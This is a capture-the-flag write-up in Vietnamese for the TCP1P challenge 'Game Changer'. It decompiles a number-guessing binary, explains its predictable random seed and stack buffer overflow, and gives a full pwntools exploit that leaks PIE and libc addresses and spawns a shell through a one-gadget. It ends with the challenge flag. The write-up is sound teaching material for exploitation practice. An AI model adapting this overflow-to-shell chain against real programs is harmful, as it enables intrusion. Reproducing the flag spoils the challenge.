# Game Changer

## Ida 

```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+4h] [rbp-Ch] BYREF
  int v5; // [rsp+8h] [rbp-8h]
  unsigned int v6; // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
  printf("Do you want to play a game? (1: Yes, 0: No): ");
  while ( (unsigned int)__isoc99_scanf("%d", &v4) != 1 || v4 > 1 )
  {
    while ( getchar() != 10 )
      ;
    printf("Invalid choice. Please enter 1 or 0: ");
  }
  while ( getchar() != 10 )
    ;
  if ( v4 )
  {
    if ( v4 == 1 )
    {
      v6 = 1;
      v5 = 0;
      while ( (int)v6 <= 5 && !v5 )
      {
        printf("Attempt %d:\n", v6);
        v5 = game();
        ++v6;
      }
      if ( v5 )
        ask();
      else
        puts("You couldn't guess the number. Better luck next time!");
    }
  }
  else
  {
    puts("Okay, maybe another time!");
  }
  return 0;
}

__int64 game()
{
  char s[20]; // [rsp+0h] [rbp-20h] BYREF
  int num_inp; // [rsp+14h] [rbp-Ch]
  unsigned int rand_result; // [rsp+18h] [rbp-8h]
  unsigned int v4; // [rsp+1Ch] [rbp-4h]

  v4 = 0;
  rand_result = randomize();
  puts("Let's play a game, try to guess a number between 1 and 100");
  fgets(s, 16, stdin);
  num_inp = atoi(s);
  if ( !num_inp )
  {
    puts("That's not a number");
    exit(0);
  }
  if ( num_inp == rand_result )
  {
    return 1;
  }
  else if ( num_inp >= (int)rand_result )
  {
    printf("Nope");
  }
  else
  {
    printf("Nope, the number i'm thinking is %d\n", rand_result);
  }
  return v4;
}

int ask()
{
  char buf[256]; // [rsp+0h] [rbp-100h] BYREF

  puts("Congrats, you guessed it correctly. What do you want to do this morning?");
  read(0, buf, 290uLL);
  if ( strlen(buf) <= 0x7F )
  {
    puts("Oh, are you an introverted person?");
    exit(0);
  }
  return printf("Oh, you want to %s...\nWow, you're a very active person!\n", buf);
}

```

## Analysis and Exploit

- 1 chall có 2 bug là srand() tại hàm game() và bof tại hàm ask()
- để qua được hàm game thì quá đơn giản rồi 

```python 
p.sendlineafter(b': ', b'1')
libc.srand(libc.time(0))
lim = (libc.rand() + 34) % 23
print(lim)
p.sendlineafter(b'1 and 100\n', str(lim))
```
- vì PIE bật nên tại ta cẩn leak cả libc lẫn exe => ta sẽ chạy lại hàm ask (brute 1.5 byte cuối) và vừa leak exe cùng lúc

![image](https://github.com/gookoosss/CTF/assets/128712571/b239f6e6-4155-4857-b606-44a101bda0d7)


- ta vào hàm ask + 1 để tránh lỗi xmm0 của hàm printf

```python 
#leak exe 
    p.send(b'a'*0x108 + b'\x5b' + b'\x53')
    p.recvuntil(b'a'*0x108)
    exe_leak = u64(p.recv(6) + b'\0\0')
    exe.address = exe_leak - 0x135a - 0x1
    print(hex(exe_leak))
    print(hex(exe.address))
```

![image](https://github.com/gookoosss/CTF/assets/128712571/739ee6ad-d7f8-4c7c-a99f-c8a97dbaa264)


- như hình trên thì ta có ow cả rip cả hàm ask và hàm main cùng lúc

```python 
    payload = b'a'*0x108
    payload += p64(exe.sym.main+1) # rip ask == main + 1
    payload += b'a'*8 + p64(exe.sym.ask+1) # rip main == ask + 1
    p.send(payload)
```
- lúc này ta cần leak libc nên ta sẽ chạy lại hàm main để xóa content trên stack và setup lại data có chứa libc, sau khi leak được libc rồi thì hàm main sẽ ret lại vào hàm ask, và ta sẽ lấy shell tại đây

```python 
# leak libc
    payload = b'a'*0xc8
    p.sendafter(b'morning?\n', payload)
    p.recvuntil(b'a'*0xc8)
    libc_leak = u64(p.recv(6) + b'\0\0')
    libc.address = libc_leak - 0x43654
    print(hex(libc_leak))
    print(hex(libc.address))

    # get shell
    payload = b'a'*0x100
    payload += p64(exe.bss()+0x100)
    payload += p64(libc.address+0xebcf5)
    p.sendafter(b'morning?\n', payload)
```
- cuối cùng thì ta cũng có flag thôi 

![image](https://github.com/gookoosss/CTF/assets/128712571/4880c10c-3493-4a3e-82a0-be5b5c94aa9a)


## script 

```python 
from pwn import *
from ctypes import CDLL

while True:
    exe = ELF("./gamechanger")
    libc = CDLL("./libc.so.6")
    context.binary = exe
    # p = remote('ctf.tcp1p.com', 9254)
    p = process([exe.path])

    gdb.attach(p, gdbscript = '''
    b*game+82
    b*ask+102         
    c
    '''          
    )
            
    input()

    p.sendlineafter(b': ', b'1')
    libc.srand(libc.time(0))
    lim = (libc.rand() + 34) % 23
    print(lim)
    p.sendlineafter(b'1 and 100\n', str(lim))

    #leak exe 
    p.send(b'a'*0x108 + b'\x5b' + b'\x53')
    p.recvuntil(b'a'*0x108)
    exe_leak = u64(p.recv(6) + b'\0\0')
    exe.address = exe_leak - 0x135a - 0x1
    print(hex(exe_leak))
    print(hex(exe.address))


    # payload = b'a'*0x100
    # payload += p64(exe.bss()+0x100) + p64(exe.sym.ask+1)
    # p.send(payload)

    payload = b'a'*0x108
    payload += p64(exe.sym.main+1) # rip ask == main + 1
    payload += b'a'*8 + p64(exe.sym.ask+1) # rip main == ask + 1
    p.send(payload)

    p.sendlineafter(b': ', b'1')
    libc.srand(libc.time(0))
    lim = (libc.rand() + 34) % 23
    print(lim)
    p.sendlineafter(b'1 and 100\n', str(lim))
    # p.sendline(str(lim))

    # leak libc
    payload = b'a'*0xc8
    p.sendafter(b'morning?\n', payload)
    p.recvuntil(b'a'*0xc8)
    libc_leak = u64(p.recv(6) + b'\0\0')
    libc.address = libc_leak - 0x43654
    print(hex(libc_leak))
    print(hex(libc.address))

    # get shell
    payload = b'a'*0x100
    payload += p64(exe.bss()+0x100)
    payload += p64(libc.address+0xebcf5)
    p.sendafter(b'morning?\n', payload)

    try:
        p.sendline(b'echo ABCD')
        p.recvuntil(b'ABCD')
        break
    except:
        try:
            p.close()
        except:
            pass


p.interactive()

# TCP1P{w0w_1ve_n3v3r_533n_5uch_4_900d_g4m3_ch4n93r_29c19ff69c5760fee1db8cac282a7b073bec936f}
```

## Flag

TCP1P{w0w_1ve_n3v3r_533n_5uch_4_900d_g4m3_ch4n93r_29c19ff69c5760fee1db8cac282a7b073bec936f}
